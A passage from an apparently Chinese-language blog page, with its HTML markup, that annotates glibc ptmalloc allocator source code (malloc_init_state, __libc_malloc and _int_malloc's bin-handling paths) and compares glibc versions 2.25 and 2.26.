(!in_smallbin_range(size)) &#123;<br>                            p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                            p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        p-&gt;bk = unsorted_bin;<br>                        p-&gt;fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//直接和top chunk合并</span><br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        av-&gt;top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//如果还没有初始化</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="malloc-init-state"><a href="#malloc-init-state" class="headerlink" title="malloc_init_state"></a>malloc_init_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Initialize a malloc_state struct.</span><br><span class="hljs-comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span><br><span class="hljs-comment">   when creating a new arena.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">malloc_init_state</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    mbinptr bin;<br>    <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at(av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin; <span class="hljs-comment">//初始化, 把所有指针都指向自己</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    <span class="hljs-comment">//2.26, 一个arena在默认情况下并不拥有fastbin chunk</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//2.25:</span><br>    av-&gt;flags |= FASTCHUNKS_BIT;<br>    <span class="hljs-comment">//将该areva的top chunk指针指向unsorted bin，用以表示初始时top chunk大小为0</span><br>    av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h1><h2 id="–libc-malloc"><a href="#–libc-malloc" class="headerlink" title="  –libc-malloc"></a><span id="__libc_malloc"> </span> <a href="#libcmalloc">–libc-malloc</a></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//这只是一个_int_malloc函数的简单wrapper</span><br><span class="hljs-keyword">void</span> * __libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim;<br>  <span class="hljs-comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span><br>  <span class="hljs-keyword">void</span> *(*hook) (<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes = request2size (bytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">//接着会寻找一个 arena 来试图分配内存</span><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">//然后调用 _int_malloc 函数去申请对应的内存</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<span class="hljs-comment">//如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//如果申请到了 arena，那么在退出之前还得解锁</span><br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//要么没有申请到内存</span><br>  <span class="hljs-comment">//要么是 mmap 的内存</span><br>  <span class="hljs-comment">//要么申请到的内存必须在其所分配的 arena 中</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//最后返回内存</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-malloc-非常之长"><a href="#int-malloc-非常之长" class="headerlink" title="_int_malloc(非常之长)"></a>_int_malloc(非常之长)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * _int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes)<br></code></pre></td></tr></table></figure><h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//if glibc2.26 and after</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_count;            <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REMOVE_FB(fb, victim, pp)                        \</span><br><span class="hljs-meta">  do                                                        \</span><br><span class="hljs-meta">    &#123;                                                        \</span><br><span class="hljs-meta">      victim = pp;                                        \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (victim == NULL)                                \</span><br><span class="hljs-meta">        break;                                                \</span><br><span class="hljs-meta">    &#125;                                                        \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">         != victim);   </span><br></code></pre></td></tr></table></figure><h3 id="简单的check"><a href="#简单的check" class="headerlink" title="简单的check"></a>简单的check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br>  checked_request2size (bytes, nb);<br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-keyword">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>注意到checked_request2size()是一个宏定义, 可以<strong>改变参数nb的值</strong> </li></ul><h3 id="fastbin-range"><a href="#fastbin-range" class="headerlink" title="fastbin_range"></a>fastbin_range</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h4 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast()))<br>&#123;<br>    idx = fastbin_index(nb);<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> <span class="hljs-comment">//取出第一个fastchunk</span><br>    &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>))<br>        &#123;<span class="hljs-comment">//请求的bytes-&gt;nb-&gt;idx-&gt;fb, 所以idx是按照bytes来确定的, 从这组idx里取出一个fastbinchunk,</span><br>            <span class="hljs-comment">//将他的大小转换为下标, 如果这两个不相等说明fastbin的size段被篡改</span><br>            <span class="hljs-comment">//chunksize(victim) != nb想来也一样吧(?</span><br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">//检查arena,大小,alignment,chunk_size等等</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">//返回用户指针</span><br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = victim-&gt;fd;<br>          <span class="hljs-keyword">else</span><br>            REMOVE_FB (fb, pp, victim);<br>          <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>              <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>                malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>              check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>              <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">                 stash them in the tcache.  */</span><br>              <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>              <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>                &#123;<br>                  mchunkptr tc_victim;<br>                  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                         &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                    &#123;<br>                      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          REMOVE_FB (fb, pp, tc_victim);<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="smallbin-range-2-26"><a href="#smallbin-range-2-26" class="headerlink" title="smallbin_range 2.26"></a>smallbin_range 2.26</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>&#123;<br>    idx = smallbin_index(nb);<br>    bin = bin_at(av, idx);<br><br>    <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin)<span class="hljs-comment">//FIFO</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span> <span class="hljs-comment">//???????</span><br>            malloc_consolidate(av);<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">//取出倒数第二个</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            set_inuse_bit_at_offset(victim, nb);<br>            bin-&gt;bk = bck;<br>            bck-&gt;fd = bin;<br><br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                set_non_main_arena(victim);<br>            check_malloced_chunk(av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>            <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">     stash them in the tcache.  */</span><br>            <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);<br>            <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>            &#123;<br>                mchunkptr tc_victim;<br><br>                <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span><br>                <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)<br>                &#123;<br>                    <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)<br>                    &#123;<br>                        bck = tc_victim-&gt;bk;<br>                        set_inuse_bit_at_offset(tc_victim, nb);<br>                        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                            set_non_main_arena(tc_victim);<br>                        bin-&gt;bk = bck;<br>                        bck-&gt;fd = bin;<br><br>                        tcache_put(tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br>            &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>            <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>            alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>###largebin_range</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*     If this is a large request, consolidate fastbins before continuing.     While it might look excessive to kill all fastbins before     even seeing if there is space available, this avoids     fragmentation problems normally associated with fastbins.     Also, in practice, programs tend to have runs of either small or     large requests, but less often mixtures, so consolidation is not     invoked all that often in most programs. And the programs that     it is called frequently in otherwise tend to fragment.   */</span>  <span class="hljs-keyword">else</span>    &#123;      idx = largebin_index (nb);      <span class="hljs-keyword">if</span> (have_fastchunks (av))        malloc_consolidate (av);    &#125;<br></code></pre></td></tr></table></figure><ul><li>简而言之就是先执行<a href="#malloc_consolidate">malloc_consolidate</a>(), 合并fastbin中的free chunks</li></ul><h3 id="unsorted-bin-大循环"><a href="#unsorted-bin-大循环" class="headerlink" title="unsorted bin 大循环"></a><em><u>unsorted bin 大循环</u></em></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     it is exact fit, or, if this a small request, the chunk is remainder from     the most recent non-exact fit.  Place other traversed chunks in     bins.  Note that this step is the only place in any routine where     chunks are placed in bins.     The outer loop here is needed because we might not realize until     near the end of malloc that we should have consolidated, so must     do so and retry. This happens at most once, and only when we would     otherwise need to expand memory to service a &quot;small&quot; request.   */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHEINTERNAL_SIZE_T tcache_nb = 0;size_t tc_idx = csize2tidx(nb);<span class="hljs-meta-keyword">if</span> (tcache &amp;&amp; tc_idx <span class="hljs-meta-string">&lt; mp_.tcache_bins)    tcache_nb = nb;int return_cached = 0;tcache_unsorted_count = 0;#endiffor (;;)&#123;    int iters = 0;    while ((victim = unsorted_chunks(av)-&gt;</span>bk) != unsorted_chunks(av))<span class="hljs-comment">// 取出链表最后一个, FIFO    &#123;        bck = victim-&gt;bk; //倒数第二个        //victim过大或过小都会出错        if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0))            malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;, chunk2mem(victim), av);                size = chunksize(victim);</span></span><br></code></pre></td></tr></table></figure><h4 id="victim-last-remainer"><a href="#victim-last-remainer" class="headerlink" title="victim == last_remainer"></a>victim == last_remainer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-comment">/*</span><br><span class="hljs-comment">           If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">           only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">           runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">           exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">           no exact fit for a small chunk.</span><br><span class="hljs-comment">         */</span><br><span class="hljs-comment">// 如果当前请求位于small chunks的大小范围内</span><br>    <span class="hljs-comment">// 同时，unsorted bin里只有一个chunk，该chunk还是last_remainder</span><br>    <span class="hljs-comment">// 并且 last remainder 的大小分割后还可以作为一个 chunk</span><br>      <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp; <br>          bck == unsorted_chunks(av) &amp;&amp; <br>          victim == av-&gt;last_remainder &amp;&amp; <br>          (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb + MINSIZE)) <span class="hljs-comment">//victim分割出nb后还有MINSIZE</span><br>      &#123;<br>          <span class="hljs-comment">/* split and reattach remainder */</span><br>          remainder_size = size - nb;<br>          <span class="hljs-comment">//分割后剩下的chunk指针</span><br>          remainder = chunk_at_offset(victim, nb);<br>          <span class="hljs-comment">//设置从unsorted bin中割出来的chunk的fd和bk</span><br>          